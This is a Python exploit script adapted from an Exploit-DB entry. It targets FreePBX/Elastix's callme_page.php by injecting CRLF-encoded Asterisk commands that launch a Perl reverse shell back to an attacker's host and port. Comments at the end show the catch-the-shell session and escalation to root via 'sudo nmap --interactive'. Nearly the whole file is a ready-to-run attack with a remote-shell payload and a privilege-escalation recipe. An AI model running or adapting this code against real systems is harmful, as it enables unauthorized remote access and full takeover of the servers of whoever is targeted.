#!/usr/bin/python3
# exploit modified by GSegundo - Bytenull00
# https://www.exploit-db.com/exploits/18650

from requests_toolbelt import SSLAdapter
import argparse
import requests
import ssl
import urllib3
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = 'ALL:@SECLEVEL=1' 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser()

parser.add_argument('--rhost',help="Remote IP address", type=str, required=True)
parser.add_argument('--lhost',help="Local IP address", type=str, required=True)	
parser.add_argument('--lport',help="Port to listen", type=str, required=True)
parser.add_argument('--extension',help="Extension number", type=str, required=True)

args = parser.parse_args()

# Reverse shell payload

print("\n[*] Exploiting ...")

url = f"https://{args.rhost}/recordings/misc/callme_page.php?action=c&callmenum={args.extension}@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22{args.lhost}%3a{args.lport}%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A"

s = requests.Session()
s.mount("https://", SSLAdapter(ssl.PROTOCOL_TLSv1))
response = s.get(url=url, verify=False)

print(f"[*] Sending reverse connection to {args.lhost}:{args.lport} ")
print("[!] Enjoy your shell, good bye !!")

# On Elastix, once we have a shell, we can escalate to root:
# root@bt:~# nc -lvp 443
# listening on [any] 443 ...
# connect to [172.16.254.223] from voip [172.16.254.72] 43415
# id
# uid=100(asterisk) gid=101(asterisk)
# sudo nmap --interactive

# Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
# Welcome to Interactive Mode -- press h <enter> for help
# nmap> !sh
# id
# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
